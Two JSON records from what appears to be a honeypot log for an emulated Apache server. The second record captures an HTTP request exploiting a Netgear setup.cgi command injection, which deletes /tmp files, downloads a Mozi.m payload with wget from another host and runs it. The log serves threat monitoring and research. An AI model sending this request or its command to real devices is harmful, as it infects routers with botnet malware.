{"customerid":"D495D9BB-0F5F-4945-9B2D-F90CAD90E413","honeyserverid":"2102ac15-bf5e-456c-ab63-90cb836ed7ad","logkind":"connection","honeypotid":"8BE585FB-2F2F-4BC6-8848-4165C1C4AA46","honeypotname":"apache-server","time":"2023-03-06T14:25:03.600666","parsedMessage":{"timestamp":"2023-03-06 14:25:03.600666","message_type":null,"correlation_id":null,"level":"INFO","message":"connection-log connection from 112.94.99.176:2442 to port 80","ip":"112.94.99.176"},"id":"07ad4516-6490-47b0-ae0c-452e63d42d22","EventProcessedUtcTime":"2023-03-06T14:25:04.0656095Z","PartitionId":0,"EventEnqueuedUtcTime":"2023-03-06T14:25:03.9720000Z","path":"D495D9BB-0F5F-4945-9B2D-F90CAD90E413/2102ac15-bf5e-456c-ab63-90cb836ed7ad/apache-server/112.94.99.176"}
{"customerid":"D495D9BB-0F5F-4945-9B2D-F90CAD90E413","honeyserverid":"2102ac15-bf5e-456c-ab63-90cb836ed7ad","logkind":"honeypot","honeypotid":"8BE585FB-2F2F-4BC6-8848-4165C1C4AA46","honeypotname":"apache-server","time":"Mon Mar  6 14:26:01 UTC 2023","parsedMessage":{"timestamp":"2023-03-06 14:25:03+00:00","message_type":"http-access","correlation_id":null,"level":"WARNING","message":"112.94.99.176 - - \"GET /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://192.168.1.1:8088/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1 HTTP/1.0\" 404 452 \"-\" \"-\"","ip":"112.94.99.176"},"id":"f2aec93f-8ff5-4956-946e-c50b52662eb8","EventProcessedUtcTime":"2023-03-06T14:26:01.8143627Z","PartitionId":0,"EventEnqueuedUtcTime":"2023-03-06T14:26:01.5860000Z","path":"D495D9BB-0F5F-4945-9B2D-F90CAD90E413/2102ac15-bf5e-456c-ab63-90cb836ed7ad/apache-server/112.94.99.176"}